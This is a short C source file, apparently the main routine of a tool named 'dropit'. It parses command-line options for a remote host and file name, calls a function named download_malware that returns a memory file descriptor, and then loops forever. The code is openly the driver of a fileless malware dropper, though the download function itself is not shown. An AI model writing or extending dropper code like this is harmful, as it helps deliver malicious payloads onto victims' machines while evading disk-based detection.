#include "dropit.h"

int     quit_dropit(t_config config, int code)
{
    freeaddrinfo(config.host_infos);
    free(config.remote_file_name);
    exit(code);
}

int     main(int ac, char **av)
{
    t_config    config;
    int         memfd;

    bzero(&config, sizeof(config));
    if (parse_opt(ac, av, &config) == -1)
        quit_dropit(config, EXIT_FAILURE);
    if ((memfd = download_malware(config)) == -1)
        quit_dropit(config, EXIT_FAILURE);
    while (1)
        ;
    quit_dropit(config, EXIT_SUCCESS);
    return (EXIT_SUCCESS);
}